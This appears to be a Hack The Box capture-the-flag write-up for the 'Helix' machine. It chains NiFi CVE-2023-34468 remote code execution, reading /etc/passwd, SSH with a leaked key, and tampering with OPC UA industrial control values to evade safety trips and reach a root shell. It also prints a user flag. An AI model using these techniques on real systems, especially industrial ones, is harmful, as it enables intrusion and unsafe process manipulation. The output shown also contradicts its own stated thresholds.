# HTB Helix - Full Attack Report

**Author:** VishalGodseye  
**Platform:** Hack The Box  
**Machine:** Helix  
**Difficulty:** Medium  
**Status:** PWNED ✅  
**Time Taken:** 3–4 Days  

---

## Target Information

| Field | Value |
|--------|---------|
| Host | helix.htb |
| OS | Ubuntu Linux |
| Open Ports | 22 (SSH), 80 (HTTP) |

---

# Step 1: Reconnaissance

## Nmap Scan

```bash
nmap -sC -sV helix.htb
```

### Output

```bash
22/tcp open ssh OpenSSH 8.9p1
80/tcp open http nginx 1.18.0
```

## Virtual Host Enumeration

Discovered:

```bash
flow.helix.htb
```

Added it to `/etc/hosts`

---

# Step 2: Apache NiFi Enumeration

Browsing `flow.helix.htb` revealed:

- Apache NiFi 1.21.0

## Vulnerability Found

**CVE-2023-34468**

This vulnerability allows:

- H2 database URL abuse
- Remote Code Execution

Affected components:

- DBCPConnectionPool
- HikariCPConnectionPool

---

# Step 3: Remote Code Execution

## NiFi Processors Used

- ExecuteSQL → Database enumeration
- ExecuteProcess → Command execution

---

## Command Execution

```bash
/usr/bin/id
```

Output:

```bash
uid=998(nifi) gid=998(nifi)
```

---

## User Enumeration

```bash
/bin/cat /etc/passwd
```

Discovered users:

- root
- operator
- nifi
- plc

---

## Database Enumeration

```sql
SELECT * FROM USERS;
```

Output:

```text
USER_NAME=OPERATOR
IS_ADMIN=true
```

---

# Step 4: Credential Discovery

## SSH Private Key Found

```bash
/opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
```

Type:

```text
OpenSSH ED25519 Private Key
```

---

## SSH Access

```bash
ssh -i id_ed25519 operator@helix.htb
```

Login successful.

---

# Step 5: User Flag

```text
f085ca00b31ba7a0069c7fd748d7483c
```

---

# Step 6: Privilege Escalation Enumeration

## Sudo Permissions

```bash
sudo -l
```

Output:

```bash
(root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

---

## Script Analysis

The `helix-maint-console` script:

- Checks for active maintenance windows
- If valid executes:

```bash
systemd-run /bin/bash -p -i
```

---

## Internal Services

| Service | Purpose |
|----------|----------|
| 127.0.0.1:4840 | OPC UA Server |
| 127.0.0.1:8080 | NiFi HTTP |
| 127.0.0.1:8081 | NiFi HTTPS |

---

# Step 7: OPC UA Exploitation

## Port Forwarding

```bash
ssh -i id_ed25519 -L 4840:127.0.0.1:4840 operator@helix.htb -N
```

This forwards the internal OPC UA service locally.

---

## Node Enumeration

| Node | Purpose |
|--------|----------|
| ns=2;i=4 | Temperature |
| ns=2;i=5 | Pressure |
| ns=2;i=6 | CalibrationOffset |
| ns=2;i=10 | TripActive |
| ns=2;i=12 | Mode |
| ns=2;i=13 | TestOverride |
| ns=2;i=14 | ResetTrip |

---

## Exploitation Steps

### Step 1

Set mode to:

```text
MAINTENANCE
```

### Step 2

Set:

```text
TestOverride = True
```

### Step 3

Slowly increase:

```text
CalibrationOffset += 0.5
```

Every 2–3 seconds.

---

## Trigger Condition

Maintenance window opens when:

- Temperature >= 295°C
- Pressure >= 73 bar

Trip thresholds:

- Temperature = 305°C
- Pressure = 75 bar

---

## Output

```text
Offset=8.5
Temp=293.08 C
Pressure=69.35 bar
Trip=False

[!] MAINTENANCE WINDOW OPEN
```

---

# Step 8: Root Access

```bash
sudo /usr/local/sbin/helix-maint-console
```

---

## Root Shell

Privilege escalation executed:

```bash
systemd-run /bin/bash -p -i
```

---

## Root Flag

```text
<redacted>
```

---

# Attack Chain

```text
Nmap
 → Virtual Host Discovery
 → Apache NiFi
 → CVE-2023-34468
 → RCE as nifi
 → SSH Key Discovery
 → SSH as operator
 → User Flag
 → OPC UA Exploitation
 → Maintenance Window
 → Sudo PrivEsc
 → Root Shell
```

---

# Tools Used

- nmap
- ffuf
- Apache NiFi
- ssh
- scp
- python3
- opcua library

---

# Key Takeaways

- Always enumerate virtual hosts
- Backup files may expose credentials
- OPC UA is common in ICS environments
- SSH tunneling exposes internal services
- Slow exploitation prevents triggering safety controls

---

# Final Thoughts

**Machine:** Helix  
**Difficulty:** Medium  
**Platform:** Hack The Box  

> Enumeration wins boxes.
> Missing `flow.helix.htb` would have killed this entire path.
